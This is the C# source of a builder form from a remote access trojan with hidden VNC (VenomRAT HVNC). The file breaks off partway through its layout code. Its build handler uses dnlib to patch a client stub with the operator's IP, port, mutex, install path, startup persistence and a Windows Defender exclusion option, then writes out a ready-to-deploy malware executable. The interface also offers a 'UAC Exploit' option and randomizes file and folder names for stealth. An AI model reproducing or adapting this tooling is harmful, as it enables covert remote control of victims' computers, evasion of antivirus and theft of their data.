using System;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.WinForms;
using VenomRAT_HVNC.HVNC.Utils;

namespace VenomRAT_HVNC.HVNC
{
    public class FrmBuilder : Form
    {
        public static byte[] b;

        public static Random r = new Random();

        public static Random random = new Random();

        private IContainer components;

        private Panel panel1;

        private Guna2ControlBox guna2ControlBox1;

        private Guna2DragControl guna2DragControl1;

        private Label label18;

        private PictureBox pictureBox1;

        private Guna2NumericUpDown txtPort;

        private Label label1;

        private Label label24;

        private Label label7;

        private Guna2Button btnBuild;

        private Guna2CustomCheckBox checkAutostart;

        private Guna2TextBox txtFilename;

        private Guna2BorderlessForm guna2BorderlessForm1;

        private Guna2Separator guna2Separator2;
        private Guna2CustomCheckBox checkWD;
        private Label label2;
        private Guna2CustomCheckBox checkUAC;
        private Label label3;
        private Guna2TextBox txtInstallPath;
        private Label label4;
        private Guna2Button btnRandomizeFileName;
        private Guna2Button btnRandomInstallPath;
        private Guna2Button btnRandomFolder;
        private Guna2TextBox txtFolder;
        private Label label5;
        public Guna2TextBox txtIP;

        public static string pathtosave { get; set; }
        private int _port { get; set; }

        public FrmBuilder(int port)
        {
            this._port = port;
            InitializeComponent();
        }

        public static string RandomString(int length)
        {
            return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", length)
                               select s[random.Next(s.Length)]).ToArray());
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrEmpty(txtIP.Text))
                {
                    MessageBox.Show("IP or DNS is required in order to build.", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog.InitialDirectory = Application.StartupPath;
                    saveFileDialog.OverwritePrompt = false;
                    saveFileDialog.FileName = "HVNC";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        pathtosave = Path.GetDirectoryName(saveFileDialog.FileName) + "\\";
                    }
                }

                if (string.IsNullOrWhiteSpace(txtIP.Text) || string.IsNullOrWhiteSpace(txtPort.Text) || string.IsNullOrWhiteSpace(txtFilename.Text) || string.IsNullOrWhiteSpace(txtFolder.Text) || string.IsNullOrWhiteSpace(txtInstallPath.Text))
                {
                    MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }

                btnBuild.Text = "Building...";
                btnBuild.Enabled = false;

                BuildInfo.ip = txtIP.Text;
                BuildInfo.port = txtPort.Text;
                BuildInfo.folder = txtFolder.Text;
                BuildInfo.filename = txtFilename.Text;
                BuildInfo.path = txtInstallPath.Text;
                BuildInfo.id = "VenomHVNC";
                BuildInfo.mutex = RandomMutex(9);
                BuildInfo.startup = "False";
                BuildInfo.wdex = "False";
                BuildInfo.hhvnc = "True";

                if (checkAutostart.Checked)
                {
                    BuildInfo.startup = "True";
                }
                else if (!checkAutostart.Checked)
                {
                    BuildInfo.startup = "False";
                }
                if (checkWD.Checked)
                {
                    BuildInfo.wdex = "True";
                }
                else if (!checkWD.Checked)
                {
                    BuildInfo.wdex = "False";
                }

                try
                {
                    ModuleDefMD moduleDefMD = ModuleDefMD.Load("client.bin");
                    foreach (TypeDef type in moduleDefMD.GetTypes())
                    {
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Name != "Main")
                            {
                                continue;
                            }
                            foreach (Instruction instruction in method.Body.Instructions)
                            {
                                if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "IP")
                                {
                                    instruction.Operand = BuildInfo.ip;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "PORT")
                                {
                                    instruction.Operand = BuildInfo.port;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "identifier")
                                {
                                    instruction.Operand = BuildInfo.id;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "mutex")
                                {
                                    instruction.Operand = BuildInfo.mutex;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "install")
                                {
                                    instruction.Operand = BuildInfo.startup;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "path")
                                {
                                    instruction.Operand = BuildInfo.path;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "folder")
                                {
                                    instruction.Operand = BuildInfo.folder;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "wdex")
                                {
                                    instruction.Operand = BuildInfo.wdex;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "a2")
                                {
                                    instruction.Operand = BuildInfo.hhvnc;
                                }
                                else if (instruction.OpCode == OpCodes.Ldstr && instruction.Operand.ToString() == "kuKdBEFei.exe")
                                {
                                    instruction.Operand = BuildInfo.filename;
                                }
                            }
                        }
                    }

                    if (File.Exists(txtFilename.Text))
                        File.Delete(txtFilename.Text);

                    moduleDefMD.Write(txtFilename.Text);

                    MessageBox.Show($"Build complete! Saved to '{txtFilename.Text}'", "Venom Rat");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            txtPort.Value = Convert.ToInt32(_port);
            txtIP.Text = GetLocalIPAddress();
        }

        public static string RandomMutex(int length)
        {
            return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
                               select s[random.Next(s.Length)]).ToArray());
        }

        public static string RandomNumber(int length)
        {
            return new string((from s in Enumerable.Repeat("0123456789", length)
                               select s[random.Next(s.Length)]).ToArray());
        }

        public static string GetLocalIPAddress()
        {
            IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress[] addressList = hostEntry.AddressList;
            foreach (IPAddress iPAddress in addressList)
            {
                if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
                {
                    return iPAddress.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.panel1 = new System.Windows.Forms.Panel();
            this.guna2Separator2 = new Guna.UI2.WinForms.Guna2Separator();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label18 = new System.Windows.Forms.Label();
            this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.txtIP = new Guna.UI2.WinForms.Guna2TextBox();
            this.txtPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.label1 = new System.Windows.Forms.Label();
            this.label24 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.btnBuild = new Guna.UI2.WinForms.Guna2Button();
            this.checkAutostart = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.txtFilename = new Guna.UI2.WinForms.Guna2TextBox();
            this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.checkWD = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.label2 = new System.Windows.Forms.Label();
            this.checkUAC = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.label3 = new System.Windows.Forms.Label();
            this.txtInstallPath = new Guna.UI2.WinForms.Guna2TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.btnRandomInstallPath = new Guna.UI2.WinForms.Guna2Button();
            this.btnRandomizeFileName = new Guna.UI2.WinForms.Guna2Button();
            this.btnRandomFolder = new Guna.UI2.WinForms.Guna2Button();
            this.txtFolder = new Guna.UI2.WinForms.Guna2TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.txtPort)).BeginInit();
            this.SuspendLayout();
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.panel1.Controls.Add(this.guna2Separator2);
            this.panel1.Controls.Add(this.pictureBox1);
            this.panel1.Controls.Add(this.label18);
            this.panel1.Controls.Add(this.guna2ControlBox1);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel1.Location = new System.Drawing.Point(0, 0);
            this.panel1.Margin = new System.Windows.Forms.Padding(4);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(883, 65);
            this.panel1.TabIndex = 13;
            this.guna2Separator2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Separator2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.guna2Separator2.FillStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            this.guna2Separator2.FillThickness = 4;
            this.guna2Separator2.Location = new System.Drawing.Point(0, -4);
            this.guna2Separator2.Margin = new System.Windows.Forms.Padding(4);
            this.guna2Separator2.Name = "guna2Separator2";
            this.guna2Separator2.Size = new System.Drawing.Size(883, 12);
            this.guna2Separator2.TabIndex = 146;
            this.pictureBox1.Location = new System.Drawing.Point(11, 9);
            this.pictureBox1.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(53, 49);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 145;
            this.pictureBox1.TabStop = false;
            this.label18.AutoSize = true;
            this.label18.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label18.Location = new System.Drawing.Point(76, 20);
            this.label18.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(80, 29);
            this.label18.TabIndex = 2;
            this.label18.Text = "HVNC";
            this.guna2ControlBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
            this.guna2ControlBox1.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox1.Location = new System.Drawing.Point(819, 9);
            this.guna2ControlBox1.Margin = new System.Windows.Forms.Padding(4);
            this.guna2ControlBox1.Name = "guna2ControlBox1";
            this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
            this.guna2ControlBox1.Size = new System.Drawing.Size(60, 48);
            this.guna2ControlBox1.TabIndex = 0;
            this.guna2DragControl1.TargetControl = this.panel1;
            this.txtIP.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.txtIP.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtIP.DefaultText = "";
            this.txtIP.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtIP.DisabledState.Parent = this.txtIP;
            this.txtIP.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtIP.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.txtIP.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtIP.FocusedState.Parent = this.txtIP;
            this.txtIP.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtIP.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtIP.HoverState.Parent = this.txtIP;
            this.txtIP.Location = new System.Drawing.Point(178, 130);
            this.txtIP.Margin = new System.Windows.Forms.Padding(4);
            this.txtIP.Name = "txtIP";
            this.txtIP.PasswordChar = '\0';
            this.txtIP.PlaceholderText = "";
            this.txtIP.SelectedText = "";
            this.txtIP.ShadowDecoration.Parent = this.txtIP;
            this.txtIP.Size = new System.Drawing.Size(404, 32);
            this.txtIP.TabIndex = 156;
            this.txtPort.BackColor = System.Drawing.Color.Transparent;
            this.txtPort.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.txtPort.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtPort.DisabledState.Parent = this.txtPort;
            this.txtPort.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.txtPort.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtPort.FocusedState.Parent = this.txtPort;
            this.txtPort.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtPort.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.txtPort.Location = new System.Drawing.Point(590, 129);
            this.txtPort.Margin = new System.Windows.Forms.Padding(4);
            this.txtPort.Maximum = new decimal(new int[] {
            65535,
            0,
            0,
            0});
            this.txtPort.Minimum = new decimal(new int[] {
            1024,
            0,
            0,
            0});
            this.txtPort.Name = "txtPort";
            this.txtPort.ShadowDecoration.Parent = this.txtPort;
            this.txtPort.Size = new System.Drawing.Size(105, 33);
            this.txtPort.TabIndex = 155;
            this.txtPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.txtPort.UpDownButtonForeColor = System.Drawing.Color.White;
            this.txtPort.Value = new decimal(new int[] {
            4443,
            0,
            0,
            0});
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.label1.Location = new System.Drawing.Point(174, 106);
            this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(70, 20);
            this.label1.TabIndex = 151;
            this.label1.Text = "IP/DNS ";
            this.label24.AutoSize = true;
            this.label24.BackColor = System.Drawing.Color.Transparent;
            this.label24.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label24.ForeColor = System.Drawing.Color.Gainsboro;
            this.label24.Location = new System.Drawing.Point(217, 184);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(63, 20);
            this.label24.TabIndex = 149;
            this.label24.Text = "Startup";
            this.label7.AutoSize = true;
            this.label7.BackColor = System.Drawing.Color.Transparent;
            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.label7.Location = new System.Drawing.Point(174, 224);
            this.label7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(90, 20);
            this.label7.TabIndex = 139;
            this.label7.Text = "File Name:";
            this.btnBuild.Animated = true;
            this.btnBuild.BorderColor = System.Drawing.Color.Maroon;
            this.btnBuild.BorderRadius = 1;
            this.btnBuild.CheckedState.Parent = this.btnBuild;
            this.btnBuild.CustomImages.Parent = this.btnBuild;
            this.btnBuild.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnBuild.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnBuild.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnBuild.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnBuild.DisabledState.Parent = this.btnBuild;
            this.btnBuild.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.btnBuild.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.btnBuild.ForeColor = System.Drawing.Color.White;
            this.btnBuild.HoverState.Parent = this.btnBuild;
            this.btnBuild.Location = new System.Drawing.Point(63, 432);
            this.btnBuild.Margin = new System.Windows.Forms.Padding(4);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.ShadowDecoration.Parent = this.btnBuild;
            this.btnBuild.Size = new System.Drawing.Size(768, 51);
            this.btnBuild.TabIndex = 158;
            this.btnBuild.Text = "Build HVNC";
            this.btnBuild.Click += new System.EventHandler(this.button1_Click);
            this.checkAutostart.BackColor = System.Drawing.Color.Transparent;
            this.checkAutostart.CheckedState.BorderRadius = 2;
            this.checkAutostart.CheckedState.BorderThickness = 0;
            this.checkAutostart.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.checkAutostart.CheckedState.Parent = this.checkAutostart;
            this.checkAutostart.CheckMarkColor = System.Drawing.SystemColors.Window;
            this.checkAutostart.Location = new System.Drawing.Point(178, 179);
            this.checkAutostart.Margin = new System.Windows.Forms.Padding(4);
            this.checkAutostart.Name = "checkAutostart";
            this.checkAutostart.ShadowDecoration.Parent = this.checkAutostart;
            this.checkAutostart.Size = new System.Drawing.Size(32, 30);
            this.checkAutostart.TabIndex = 159;
            this.checkAutostart.Text = "guna2CustomCheckBox1";
            this.checkAutostart.UncheckedState.BorderColor = System.Drawing.Color.Transparent;
            this.checkAutostart.UncheckedState.BorderRadius = 2;
            this.checkAutostart.UncheckedState.BorderThickness = 0;
            this.checkAutostart.UncheckedState.FillColor = System.Drawing.Color.Transparent;
            this.checkAutostart.UncheckedState.Parent = this.checkAutostart;
            this.txtFilename.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.txtFilename.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtFilename.DefaultText = "HVNC.exe";
            this.txtFilename.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtFilename.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtFilename.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtFilename.DisabledState.Parent = this.txtFilename;
            this.txtFilename.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtFilename.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.txtFilename.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtFilename.FocusedState.Parent = this.txtFilename;
            this.txtFilename.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtFilename.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtFilename.HoverState.Parent = this.txtFilename;
            this.txtFilename.Location = new System.Drawing.Point(178, 248);
            this.txtFilename.Margin = new System.Windows.Forms.Padding(4);
            this.txtFilename.Name = "txtFilename";
            this.txtFilename.PasswordChar = '\0';
            this.txtFilename.PlaceholderText = "";
            this.txtFilename.SelectedText = "";
            this.txtFilename.ShadowDecoration.Parent = this.txtFilename;
            this.txtFilename.Size = new System.Drawing.Size(382, 30);
            this.txtFilename.TabIndex = 156;
            this.guna2BorderlessForm1.AnimateWindow = true;
            this.guna2BorderlessForm1.ContainerControl = this;
            this.guna2BorderlessForm1.DockIndicatorColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.checkWD.BackColor = System.Drawing.Color.Transparent;
            this.checkWD.CheckedState.BorderRadius = 2;
            this.checkWD.CheckedState.BorderThickness = 0;
            this.checkWD.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.checkWD.CheckedState.Parent = this.checkWD;
            this.checkWD.CheckMarkColor = System.Drawing.SystemColors.Window;
            this.checkWD.Location = new System.Drawing.Point(345, 179);
            this.checkWD.Margin = new System.Windows.Forms.Padding(4);
            this.checkWD.Name = "checkWD";
            this.checkWD.ShadowDecoration.Parent = this.checkWD;
            this.checkWD.Size = new System.Drawing.Size(32, 30);
            this.checkWD.TabIndex = 161;
            this.checkWD.Text = "guna2CustomCheckBox1";
            this.checkWD.UncheckedState.BorderColor = System.Drawing.Color.Transparent;
            this.checkWD.UncheckedState.BorderRadius = 2;
            this.checkWD.UncheckedState.BorderThickness = 0;
            this.checkWD.UncheckedState.FillColor = System.Drawing.Color.Transparent;
            this.checkWD.UncheckedState.Parent = this.checkWD;
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.Gainsboro;
            this.label2.Location = new System.Drawing.Point(384, 184);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(115, 20);
            this.label2.TabIndex = 160;
            this.label2.Text = "WD Exclusion";
            this.checkUAC.BackColor = System.Drawing.Color.Transparent;
            this.checkUAC.CheckedState.BorderRadius = 2;
            this.checkUAC.CheckedState.BorderThickness = 0;
            this.checkUAC.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.checkUAC.CheckedState.Parent = this.checkUAC;
            this.checkUAC.CheckMarkColor = System.Drawing.SystemColors.Window;
            this.checkUAC.Location = new System.Drawing.Point(557, 179);
            this.checkUAC.Margin = new System.Windows.Forms.Padding(4);
            this.checkUAC.Name = "checkUAC";
            this.checkUAC.ShadowDecoration.Parent = this.checkUAC;
            this.checkUAC.Size = new System.Drawing.Size(32, 30);
            this.checkUAC.TabIndex = 163;
            this.checkUAC.Text = "guna2CustomCheckBox1";
            this.checkUAC.UncheckedState.BorderColor = System.Drawing.Color.Transparent;
            this.checkUAC.UncheckedState.BorderRadius = 2;
            this.checkUAC.UncheckedState.BorderThickness = 0;
            this.checkUAC.UncheckedState.FillColor = System.Drawing.Color.Transparent;
            this.checkUAC.UncheckedState.Parent = this.checkUAC;
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.Gainsboro;
            this.label3.Location = new System.Drawing.Point(596, 184);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(99, 20);
            this.label3.TabIndex = 162;
            this.label3.Text = "UAC Exploit";
            this.txtInstallPath.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.txtInstallPath.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtInstallPath.DefaultText = "%AppData%";
            this.txtInstallPath.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtInstallPath.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtInstallPath.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtInstallPath.DisabledState.Parent = this.txtInstallPath;
            this.txtInstallPath.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtInstallPath.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.txtInstallPath.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtInstallPath.FocusedState.Parent = this.txtInstallPath;
            this.txtInstallPath.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtInstallPath.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtInstallPath.HoverState.Parent = this.txtInstallPath;
            this.txtInstallPath.Location = new System.Drawing.Point(178, 374);
            this.txtInstallPath.Margin = new System.Windows.Forms.Padding(4);
            this.txtInstallPath.Name = "txtInstallPath";
            this.txtInstallPath.PasswordChar = '\0';
            this.txtInstallPath.PlaceholderText = "";
            this.txtInstallPath.SelectedText = "";
            this.txtInstallPath.SelectionStart = 9;
            this.txtInstallPath.ShadowDecoration.Parent = this.txtInstallPath;
            this.txtInstallPath.Size = new System.Drawing.Size(382, 30);
            this.txtInstallPath.TabIndex = 165;
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.Transparent;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.label4.Location = new System.Drawing.Point(174, 350);
            this.label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(97, 20);
            this.label4.TabIndex = 164;
            this.label4.Text = "Install Path:";
            this.btnRandomInstallPath.Animated = true;
            this.btnRandomInstallPath.BorderColor = System.Drawing.Color.Maroon;
            this.btnRandomInstallPath.BorderRadius = 1;
            this.btnRandomInstallPath.CheckedState.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.CustomImages.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnRandomInstallPath.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnRandomInstallPath.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnRandomInstallPath.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnRandomInstallPath.DisabledState.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.btnRandomInstallPath.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnRandomInstallPath.ForeColor = System.Drawing.Color.White;
            this.btnRandomInstallPath.HoverState.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.Location = new System.Drawing.Point(581, 374);
            this.btnRandomInstallPath.Margin = new System.Windows.Forms.Padding(4);
            this.btnRandomInstallPath.Name = "btnRandomInstallPath";
            this.btnRandomInstallPath.ShadowDecoration.Parent = this.btnRandomInstallPath;
            this.btnRandomInstallPath.Size = new System.Drawing.Size(114, 30);
            this.btnRandomInstallPath.TabIndex = 166;
            this.btnRandomInstallPath.Text = "Randomize";
            this.btnRandomInstallPath.Click += new System.EventHandler(this.btnRandomInstallPath_Click);
            this.btnRandomizeFileName.Animated = true;
            this.btnRandomizeFileName.BorderColor = System.Drawing.Color.Maroon;
            this.btnRandomizeFileName.BorderRadius = 1;
            this.btnRandomizeFileName.CheckedState.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.CustomImages.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnRandomizeFileName.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
